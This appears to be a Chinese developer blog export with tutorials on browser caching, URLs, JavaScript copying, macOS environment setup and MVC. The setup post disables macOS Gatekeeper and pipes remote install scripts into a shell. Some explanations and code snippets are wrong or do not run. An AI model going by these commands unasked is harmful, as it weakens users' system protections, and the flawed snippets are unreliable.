    <url>/2019/03/03/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>从缓存位置及缓存机制来探讨浏览器的缓存<br><a id="more"></a></p>
<h3 id="缓存位置"><a href="#缓存位置" class="headerlink" title="缓存位置"></a>缓存位置</h3><p>缓存位置分为四种，它们之间存在优先级，通常来说在一次查找缓存且都没有命中时，才会发起网络请求</p>
<ul>
<li>Sevice Worker</li>
<li>Memory Cache</li>
<li>Disk Cache</li>
<li>Push Cache</li>
<li>网络请求</li>
</ul>
<ol>
<li>Service Worker<br>它是运行在浏览器背后的独立线程，使用 Service Worker 传输协议必须使用HTTPS，因为它涉及到请求拦截。Service Worker的缓存不同于浏览器内建的其他缓存机制，它可以让我们自由控制缓存哪些文件、如何匹配缓存、如何读取缓存，并且缓存是持续性的。</li>
<li>Memory Cache<br>它是内存中的缓存，读取内存中的数据肯定比磁盘快。虽然读取高效，但缓存持续性短，会随着进程的释放而释放。一旦关闭Tab，内存中的缓存就被释放。</li>
</ol>
<p>虽说内存缓存很高效，但不能将所有数据都存放在内存中。因为计算机的内存一定比硬盘容量小得多，操作系统需要精打细算内存的使用，所以可供我们使用的并不多。但浏览器会把哪些文件丢进内存呢？- 对于大文件来说，大概率是不存储在内存中的，反之优先；- 当系统内存使用率高的话，文件会优先存进硬盘；</p>
<ol start="3">
<li>Disk Cache<br>Disk Cache就是存储在硬盘上的缓存，虽读取速度慢，但是什么都能存，相比Memory Cache胜在容量和存储时效性上。</li>
</ol>
<p>在所有浏览器缓存中，Disk Cache 覆盖面基本是最大的，它会根据 HTTP Header 中的字段判断哪些资源需要缓存，哪些资源可以不请求直接使用，哪些资源已过期需要重新请求。并且即使在跨站点的情况下，相同地址的资源一旦被硬盘缓存下来，就不会再次去请求数据。</p>
<ol start="4">
<li><p>Push Cache<br>当以上三种缓存都没有，命中时，才会被使用，而且缓存时间很短，只在会话（Session）中存在，一旦会话结束就被释放</p>
<h3 id="缓存策略"><a href="#缓存策略" class="headerlink" title="缓存策略"></a>缓存策略</h3><p>浏览器缓存策略通常分为强缓存和协商缓存，并且缓存都是通过设置HTTP Header实现的</p>
<h4 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h4><p>强缓存可以通过设置 Expires 和 Cache-Control 这两个 HTTP Header 来实现，强缓存表示在缓存期间不需要请求，state code 为200</p>
</li>
<li><p>Expires</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Expires</span>: Wed, 22 Oct 2018 08:41:00 GMT  // 表示资源会在 Wed, 22 Oct 2018 08:41:00 GMT 后过期，但由于 Expires 受限于本地时间，如果修改了本地时间，可能会导致缓存失效</span><br></pre></td></tr></table></figure>
</li>
<li><p>Cache-Control</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Cache-control</span>: max-age=30  // 表示资源会在30秒后过期，需要再次请求。Cache-Control可以在请求头或响应头中设置</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h4><p>如果缓存过期了，就需要发起请求验证资源是否有更新。协商缓存可以通过设置两种 HTTP Header 实现：Last-Modified 和 ETag。当浏览器发起请求验证资源时，若没有改变，那么服务器返回状态码 304，并更新浏览器缓存有效期</p>
<ol>
<li>Last-Modified<br>Last-Modified 表示本地文件最后修改日期，If-Modified-Since 会将 Last-Modified 的值发送给服务器，询问服务器在该日期后资源是否有更新，有更新的话就会将新的资源发送回来，否则返回 304 状态码</li>
<li>ETag<br>If-None-Match 会将当前 ETag 发送给服务器，询问该资源 ETag 是否变动，有变动的话就将新的资源发送回来。并且 ETag 优先级比 Last-Modified 高。</li>
</ol>
]]></content>
      <tags>
        <tag>性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析URL</title>
    <url>/2022/03/09/%E6%B5%85%E6%9E%90URL/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>含义：统一资源定位符(Uniform Resource Locator)，URL=协议+域名或IP+端口号（默认的不显示）+路径+查询参数+锚点<br><img src="https://s2.loli.net/2022/03/09/p7I2Hr3CWZuQTom.png" alt="4158026B-FDAA-400D-B35A-C568BEA9F806.png"></p>
<ul>
<li>通过改变<strong>路径</strong>可以请求不同的页面</li>
</ul>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTML</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS</a></p>
<ul>
<li>通过改变<strong>查询参数</strong>可以访问同一个页面不同内容</li>
</ul>
<p><a href="https://www.baidu.com/s?wd=hello" target="_blank" rel="noopener">https://www.baidu.com/s?wd=hello</a></p>
<p><a href="https://www.baidu.com/s?wd=parent" target="_blank" rel="noopener">https://www.baidu.com/s?wd=parent</a></p>
<ul>
<li>通过改变<strong>锚点</strong>可以看到同一页面同一内容的不同位置</li>
</ul>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS#%E6%95%99%E7%A8%8B#教程" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS#%E6%95%99%E7%A8%8B#教程</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS#%E5%8F%82%E8%80%83%E4%B9%A6#参考书" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS#%E5%8F%82%E8%80%83%E4%B9%A6#参考书</a></p>
<p>注意：</p>
<p>锚点不支持中文，所以会把中文变成#%E6%95%99%E7%A8%8B</p>
<p>锚点不会发送给服务器，所以在开发者工具的Network面板看不到</p>
<hr>
<p>IP网际协议（Internet Protocol）也叫域名，是一串字符串，用来定位一台设备</p>
<p>端口（80、443等）用来定位一个设备的服务，IP和端口缺一不可</p>
<p>使用<strong>ping</strong>命令<strong>获取IP地址</strong><br><img src="https://s2.loli.net/2022/03/09/pcKEJ3QUFZBYmuh.png" alt="6A8E48A0-D484-47E6-A982-A91EE7CA601D.png"></p>
<p>使用<strong>nslookup</strong>命令<strong>解析域名</strong></p>
<p><img src="https://s2.loli.net/2022/03/09/bBQvkqshZ4CGVnx.png" alt="E08CB706-EBF4-4C29-AEE1-E7283D5E4D30.png"></p>
<hr>
<p>DNS域名系统（Domain Name System），将域名（baidu.com）和它的IP地址（220.181.38.148）对应起来</p>
<p>用<strong>curl</strong>命令<strong>发HTTP请求</strong><br><img src="https://s2.loli.net/2022/03/09/6astOqfmZX7v12N.png" alt="B6748EB5-3697-43BD-8D77-19A693C08EF9.png"></p>
]]></content>
  </entry>
  <entry>
    <title>深拷贝&amp;&amp;浅拷贝</title>
    <url>/2019/03/02/%E6%B7%B1%E6%8B%B7%E8%B4%9D-%E6%B5%85%E6%8B%B7%E8%B4%9D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>浅拷贝和深拷贝的几种常见方法<br><a id="more"></a></p>
<h3 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h3><p>复杂类型即对象在赋值过程中其实复制的是一个地址（指针），这个指针指向计算机的一小块内存，从而导致修改一个地方其他地方也跟着改变，但我们不希望这种情况发生，可以使用浅拷贝解决这个问题<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let a = &#123;</span><br><span class="line">  age: 18</span><br><span class="line">&#125;</span><br><span class="line">let b = a;</span><br><span class="line">a.age = 20;</span><br><span class="line">console.log(b.age);  // 输出20</span><br></pre></td></tr></table></figure></p>
<ul>
<li><p>通过Object.assign，它只会拷贝所有的属性值到新对象中，如果属性值是对象的话，拷贝的是地址，并不是深拷贝</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let a = &#123;</span><br><span class="line">  age: 18</span><br><span class="line">&#125;</span><br><span class="line">let b = Object.assign(&#123;&#125;,a);</span><br><span class="line">a.age = 20;</span><br><span class="line">console.log(b.age);  // 18</span><br></pre></td></tr></table></figure>
</li>
<li><p>另外还可以通过展开运算符…来实现浅拷贝</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let a = &#123;</span><br><span class="line">  age: 18</span><br><span class="line">&#125;</span><br><span class="line">let b = &#123; ...a &#125;</span><br><span class="line">a.age = 20</span><br><span class="line">console.log(b.age) // 18</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>浅拷贝只解决了第一层问题，如果接下去的值中还有对象的话，那么就又回到最开始的话题了，两者享有同一个地址。要解决这个问题，我们就要使用深拷贝了</p>
<h3 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h3><ul>
<li>JSON实现深拷贝<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let a = &#123;</span><br><span class="line">  age: 18,</span><br><span class="line">  jobs: &#123;</span><br><span class="line">    first: &apos;doctor&apos;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">let b = JSON.parse(JSON.stringify(a))  // 将这个对象变成字符串，再从这个字符串中生成一个对象</span><br><span class="line">a.jobs.first = &apos;teacher&apos;</span><br><span class="line">console.log(b.jobs.first) // doctor</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>但是这个方法有局限性，JSON不支持函数，引用，undefined，正则，Date日期对象</p>
<ul>
<li>如果想自己实现一个深拷贝，这里只能实现一个简易版本，有许多边界情况没有考虑到，但在实际应用中更推荐lodash的深拷贝函数<a href="https://lodash.com/docs/4.17.11#cloneDeep" target="_blank" rel="noopener">https://lodash.com/docs/4.17.11#cloneDeep</a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function deepClone(obj) &#123;</span><br><span class="line">  function isObject(o) &#123;</span><br><span class="line">    return (typeof o === &apos;object&apos; || typeof o === &apos;function&apos;) &amp;&amp; o !== null</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (!isObject(obj)) &#123;</span><br><span class="line">    throw new Error(&apos;非对象&apos;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  let isArray = Array.isArray(obj)</span><br><span class="line">  let newObj = isArray ? [...obj] : &#123; ...obj &#125;</span><br><span class="line">  Reflect.ownKeys(newObj).forEach(key =&gt; &#123;</span><br><span class="line">    newObj[key] = isObject(obj[key]) ? deepClone(obj[key]) : obj[key]</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  return newObj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let obj = &#123;</span><br><span class="line">  a: [1, 2, 3],</span><br><span class="line">  b: &#123;</span><br><span class="line">    c: 2,</span><br><span class="line">    d: 3</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">let newObj = deepClone(obj)</span><br><span class="line">newObj.b.c = 1</span><br><span class="line">console.log(obj.b.c) // 2</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>环境配置</title>
    <url>/2018/11/27/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>mac环境配置<br><a id="more"></a></p>
<h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><h3 id="允许安装不安全的软件"><a href="#允许安装不安全的软件" class="headerlink" title="允许安装不安全的软件"></a>允许安装不安全的软件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo spctl --master-disable</span><br></pre></td></tr></table></figure>
<h3 id="Homebrew"><a href="#Homebrew" class="headerlink" title="Homebrew"></a>Homebrew</h3><p>安装软件包管理系统，它简化了Mac OS X系统上的软件安装过程<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ /usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br><span class="line">- /usr/bin/ruby -e：使用ruby环境运行</span><br><span class="line">- curl -fsSL：使用curl命令下载</span><br></pre></td></tr></table></figure></p>
<h3 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh my zsh"></a>oh my zsh</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ zsh  --version  // 安装前先查看版本</span><br><span class="line">$ brew install zsh  // 安装zsh</span><br><span class="line">$ sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;  // 使用oh-my-zsh让zsh更加强大</span><br></pre></td></tr></table></figure>
<p>还可以安装一些oh-my-zsh的插件：<a href="https://github.com/wting/autojump/" title="autojump" target="_blank" rel="noopener">autojump</a></p>
<h3 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ brew install node  // 安装node后会自动安装npm（node package manager），用来搜索、下载、管理 Node.js 相关套件</span><br></pre></td></tr></table></figure>
<p>如果未安装Homebrew，nodejs下载传送：<a href="https://nodejs.org/zh-cn/download/" title="nodejs" target="_blank" rel="noopener">nodejs</a></p>
<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><p>vim 是 Unix/Linux 终端自带的，macOS也有。它带有很多快捷键，死记硬背不如实际多用:)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:q! 不保存直接退出</span><br><span class="line">:wq 保存后退出</span><br></pre></td></tr></table></figure></p>
<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ brew install git</span><br><span class="line"></span><br><span class="line"># git配置文件目录</span><br><span class="line">~/.gitconfig</span><br><span class="line"></span><br><span class="line"># 基本配置</span><br><span class="line">git config --global user.name &quot;joyce&quot;</span><br><span class="line">git config --global user.email &quot;jayce_ma.xa@foxmail.com&quot;</span><br><span class="line">git config --global color.ui true</span><br><span class="line">git config --global core.editor &quot;vim&quot;  # 设置Editor使用vim</span><br><span class="line">git config --global core.quotepath false # 设置显示中文文件名</span><br></pre></td></tr></table></figure>
<h2 id="终端命令"><a href="#终端命令" class="headerlink" title="终端命令"></a>终端命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ say xxx  读单词</span><br><span class="line">$ pwd  显示当前目录的路径名</span><br><span class="line">$ cd /  返回根目录</span><br><span class="line">$ cd -  返回上一级目录</span><br><span class="line">$ man xxx  查看命令的详细帮助</span><br><span class="line">$ rm xxx  删除文件</span><br><span class="line">$ rm -rf xxx  删除文件夹</span><br></pre></td></tr></table></figure>
<p>我的另一篇博客：<a href="https://jaycemxy.github.io/2018/08/28/%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/" title="命令行基础操作" target="_blank" rel="noopener">命令行基础操作</a></p>
<h2 id="VSCode快捷键"><a href="#VSCode快捷键" class="headerlink" title="VSCode快捷键"></a>VSCode快捷键</h2><h3 id="编辑器与窗口"><a href="#编辑器与窗口" class="headerlink" title="编辑器与窗口"></a>编辑器与窗口</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 打开一个新窗口 Cmd + Shift + N</span><br><span class="line"># 关闭窗口 Cmd + Shift + W</span><br><span class="line"></span><br><span class="line"># 新建文件 Cmd + N</span><br><span class="line"># 关闭文件 Cmd + W</span><br><span class="line"># 同一编辑器下文件相互切换 control + tab</span><br><span class="line"></span><br><span class="line"># 多个编辑器之间切换 Cmd + ~</span><br><span class="line"># 控制左侧边栏显隐 Cmd + B</span><br></pre></td></tr></table></figure>
<h3 id="编辑代码"><a href="#编辑代码" class="headerlink" title="编辑代码"></a>编辑代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 复制，如果未选择文本则复制整行 Cmd + c</span><br><span class="line"># 剪切，如果未选中文本则剪切整行 Cmd + x</span><br><span class="line"></span><br><span class="line"># 移动整行 alt + ↑/↓</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>浅析MVC</title>
    <url>/2022/04/21/%E6%B5%85%E6%9E%90MVC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="什么是MVC"><a href="#什么是MVC" class="headerlink" title="什么是MVC"></a>什么是MVC</h2><p>MVC包括三个对象，分别是Model、View、Controller，通过将代码进行模块化的分离，以便于提高代码的灵活性和复用性。</p>
<ul>
<li>M-model数据模型，负责与数据相关的任务（包括增删改查），会有一个或多个视图监听该模型，一旦数据发生改变，模型将通知相关视图</li>
<li>V-view视图层，是提供给用户操作的界面，当model层的数据发生改变，视图也会相应的进行更新</li>
<li>C-controller控制器，起到在不同层面的组织作用。通过监听用户事件，来处理用户行为和数据上的改变</li>
</ul>
<h4 id="Model层：负责操作数据"><a href="#Model层：负责操作数据" class="headerlink" title="Model层：负责操作数据"></a>Model层：负责操作数据</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> Model = &#123;</span><br><span class="line">    data: &#123;&#125;,</span><br><span class="line">    create: &#123;&#125;,</span><br><span class="line">    <span class="keyword">delete</span>: &#123;&#125;,</span><br><span class="line">    update(data)&#123;</span><br><span class="line">        <span class="built_in">Object</span>.assign(m.data, data)  <span class="comment">// 更新数据</span></span><br><span class="line">        eventBus.trigger(<span class="string">'m:update'</span>)  <span class="comment">// 触发'm:update'并通知view更新</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">get</span>: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="View层：负责视图"><a href="#View层：负责视图" class="headerlink" title="View层：负责视图"></a>View层：负责视图</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> View = &#123;</span><br><span class="line">    el: el,  <span class="comment">// 需要更新的元素</span></span><br><span class="line">    html: <span class="string">``</span>,  <span class="comment">// 显示在页面中的内容</span></span><br><span class="line">    init()&#123;</span><br><span class="line">        v.el: <span class="comment">// 初始化需要更新的元素</span></span><br><span class="line">    &#125;,</span><br><span class="line">    render()&#123;&#125;  <span class="comment">// 重新渲染</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Controller层：负责其他"><a href="#Controller层：负责其他" class="headerlink" title="Controller层：负责其他"></a>Controller层：负责其他</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> Controller = &#123;</span><br><span class="line">    init()&#123;</span><br><span class="line">        v.init(),  <span class="comment">// 初始化view</span></span><br><span class="line">        v.render(),  <span class="comment">// 第一次渲染页面</span></span><br><span class="line">        c.autoBindEvents(),  <span class="comment">// 事件绑定</span></span><br><span class="line">        eventBus.on(<span class="string">'m:update'</span>, ()=&gt;&#123;  <span class="comment">// 当eventBus触发'm:update'时，刷新view</span></span><br><span class="line">            v.render()</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    events: &#123;  <span class="comment">// 用哈希表储存事件信息</span></span><br><span class="line">        <span class="string">'click #add1'</span> : <span class="string">'add'</span>,</span><br><span class="line">        <span class="string">'click #minus'</span>: <span class="string">'minus'</span>,</span><br><span class="line">        <span class="string">'click #mul2'</span>: <span class="string">'mul'</span>,</span><br><span class="line">        <span class="string">'click #divide2'</span>: <span class="string">'div'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    add()&#123;</span><br><span class="line">        m.update(&#123;<span class="attr">n</span>: m.data.n + <span class="number">1</span>&#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    minus()&#123;</span><br><span class="line">        m.update(&#123;<span class="attr">n</span>: m.data.n - <span class="number">1</span>&#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    mul()&#123;</span><br><span class="line">        m.update(&#123;<span class="attr">n</span>: m.data.n * <span class="number">2</span>&#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    div()&#123;</span><br><span class="line">        m.update(&#123;<span class="attr">n</span>: m.data.n / <span class="number">2</span>&#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    methods()&#123;</span><br><span class="line">        data=新数据</span><br><span class="line">        m.update(data)  <span class="comment">// 通知model更新数据</span></span><br><span class="line">    &#125;,</span><br><span class="line">    autoBindEvents()&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> c.events)&#123;  <span class="comment">// 遍历events表，自动绑定事件</span></span><br><span class="line">            <span class="keyword">const</span> value = c[c.events[key]]</span><br><span class="line">            <span class="keyword">const</span> spaceIndex = key.indexOf(<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">const</span> part1 = key.slice(<span class="number">0</span>, spaceIndex)  <span class="comment">// 拿到'click'</span></span><br><span class="line">            <span class="keyword">const</span> part2 = key.slice(spaceIndex + <span class="number">1</span>)  <span class="comment">// 拿到对应元素'#add1'、'#minus'、'#mul2'、'#div2'</span></span><br><span class="line">            v.el.on(part1, part2, value)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="EventBus"><a href="#EventBus" class="headerlink" title="EventBus"></a>EventBus</h2><p>EventBus用于模块间通讯，常用的api包括事件触发（trigger）、事件监听（on）、取消监听（off）<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> $ <span class="keyword">from</span> <span class="string">'jquery'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EventBus</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>._eventBus = $(<span class="built_in">window</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    on(eventName,fn)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>._eventBus.on(eventName,fn)</span><br><span class="line">    &#125;</span><br><span class="line">    trigger(eventName,data)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>._eventBus.trigger(eventName,data)</span><br><span class="line">    &#125;</span><br><span class="line">    off()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>._eventBus.off(eventName,fn)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> EventBus</span><br><span class="line"></span><br><span class="line"><span class="comment">// new.js</span></span><br><span class="line"><span class="keyword">import</span> EventBus <span class="keyword">from</span> <span class="string">'EventBus.js'</span></span><br><span class="line"><span class="keyword">const</span> e = <span class="keyword">new</span> EventBus()</span><br><span class="line">e.on()</span><br><span class="line">e.trigger()</span><br><span class="line">e.off()</span><br></pre></td></tr></table></figure></p>
<h2 id="表驱动编程"><a href="#表驱动编程" class="headerlink" title="表驱动编程"></a>表驱动编程</h2><p>表驱动是一种编程模式，从哈希表里查找信息而不是重复使用if…else语句。对于简单的情况，使用逻辑语句更加轻松直白，但对于复杂的逻辑链来说，表驱动有着更稳定的复杂度。下面这段代码有着极高的相似度和重复性：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$button1.on(<span class="string">'click'</span>,()=&gt;&#123;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="built_in">parseInt</span>($number.text())</span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line">    localStorage.setItem(<span class="string">'n'</span>,n)</span><br><span class="line">    $number.text(n)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$button2.on(<span class="string">'click'</span>,()=&gt;&#123;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="built_in">parseInt</span>($number.text())</span><br><span class="line">    n -= <span class="number">1</span></span><br><span class="line">    localStorage.setItem(<span class="string">'n'</span>,n)</span><br><span class="line">    $number.text(n)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$button3.on(<span class="string">'click'</span>,()=&gt;&#123;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="built_in">parseInt</span>($number.text())</span><br><span class="line">    n *= <span class="number">2</span></span><br><span class="line">    localStorage.setItem(<span class="string">'n'</span>,n)</span><br><span class="line">    $number.text(n)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$button4.on(<span class="string">'click'</span>,()=&gt;&#123;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="built_in">parseInt</span>($number.text())</span><br><span class="line">    n /= <span class="number">2</span></span><br><span class="line">    localStorage.setItem(<span class="string">'n'</span>,n)</span><br><span class="line">    $number.text(n)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>用事件委托<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> c = &#123;</span><br><span class="line">    init(container) &#123;</span><br><span class="line">        v.init(container)</span><br><span class="line">        v.render(m.data.n)</span><br><span class="line">        c.bindEvents()</span><br><span class="line">    &#125;</span><br><span class="line">    bindEvents() &#123;</span><br><span class="line">        v.el.on(<span class="string">'click'</span>,<span class="string">'#add1'</span>,()=&gt;&#123;</span><br><span class="line">            m.data.n += <span class="number">1</span></span><br><span class="line">            v.render(m.data.n)</span><br><span class="line">        &#125;)</span><br><span class="line">        v.el.on(<span class="string">'click'</span>,<span class="string">'#minus1'</span>,()=&gt;&#123;</span><br><span class="line">            m.data.n -= <span class="number">1</span></span><br><span class="line">            v.render(m.data.n)</span><br><span class="line">        &#125;)</span><br><span class="line">        v.el.on(<span class="string">'click'</span>,<span class="string">'#mul2'</span>,()=&gt;&#123;</span><br><span class="line">            m.data.n *= <span class="number">2</span></span><br><span class="line">            v.render(m.data.n)</span><br><span class="line">        &#125;)</span><br><span class="line">        v.el.on(<span class="string">'click'</span>,<span class="string">'#divide2'</span>,()=&gt;&#123;</span><br><span class="line">            m.data.n /= <span class="number">2</span></span><br><span class="line">            v.render(m.data.n)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>用哈希表存储&lt;按钮&gt;及按下按钮对应的&lt;事件&gt;，这样使得数据和事件清晰的分离<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> c = &#123;</span><br><span class="line">    events:&#123;</span><br><span class="line">        <span class="string">'click #add1'</span>:<span class="string">'add'</span>,</span><br><span class="line">        <span class="string">'click #minus1'</span>:<span class="string">'minus'</span>,</span><br><span class="line">        <span class="string">'click #mul2'</span>:<span class="string">'mul'</span>,</span><br><span class="line">        <span class="string">'click #divide2'</span>:<span class="string">'div'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    add()&#123;</span><br><span class="line">        m.update( data: &#123;<span class="attr">n</span>:m.data.n + <span class="number">1</span>&#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    minus()&#123;</span><br><span class="line">        m.update( data:&#123;<span class="attr">n</span>:m.data.n - <span class="number">1</span>&#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    mul()&#123;</span><br><span class="line">        m.update( data: &#123;<span class="attr">n</span>:m.data.n * <span class="number">2</span>&#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    div()&#123;</span><br><span class="line">        m.update(data: &#123;<span class="attr">n</span>:m.data.n / <span class="number">2</span>&#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    autoBindEvents()&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> c.events)&#123;</span><br><span class="line">            <span class="keyword">const</span> value = c[c.events[key]]</span><br><span class="line">            <span class="keyword">const</span> spaceIndex = key.indexOf(<span class="string">' '</span>)</span><br><span class="line">            <span class="keyword">const</span> part1 = key.slice(<span class="number">0</span>,spaceIndex)</span><br><span class="line">            <span class="keyword">const</span> part2 = key.slice(spaceIndex + <span class="number">1</span>)</span><br><span class="line">            v.el.on(part1,part2,value)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h2><ul>
<li>将一段复杂的代码依据一定的规则抽取成一个个较小规模的块，块与块之间相对独立</li>
<li>“块”可以理解为实现特定功能的一组方法</li>
<li>块的内部数据(变量)与实现(函数)是私有的，只是向外部暴露了一些接口使其与外部其它模块通讯</li>
